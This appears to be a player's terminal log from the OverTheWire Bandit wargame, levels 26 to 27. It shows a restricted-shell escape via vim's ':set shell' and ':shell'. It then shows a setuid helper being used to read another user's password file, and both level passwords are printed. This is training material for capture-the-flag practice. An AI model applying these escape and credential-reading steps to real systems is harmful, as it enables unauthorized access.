# broke out of vim with:
:set shell=/bin/bash
:shell




# bash
jonesy@ubuntu:~/security6841/overTheWire$ ssh bandit26@bandit.labs.overthewire.org -p 2220
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit26@bandit.labs.overthewire.org's password: 
Linux bandit 4.18.12 x86_64 GNU/Linux
               
      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"  
     \   \ .'        ;   |.'       \   \ ;     
  www. `---` ver     '---' he       '---" ire.org     
               
              
Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames. 
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with 
  easily guessable or short names will be periodically deleted!
	
  Please play nice:
      
    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS! 
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
~                                                                                              
:shell
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ cat text.txt 
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
bandit26@bandit:~$ 
bandit26@bandit:~$ ./bandit27-do 
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ 
bandit26@bandit:~$ cat /etc/bandit_pass/bandit27
cat: /etc/bandit_pass/bandit27: Permission denied
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
bandit26@bandit:~$ 
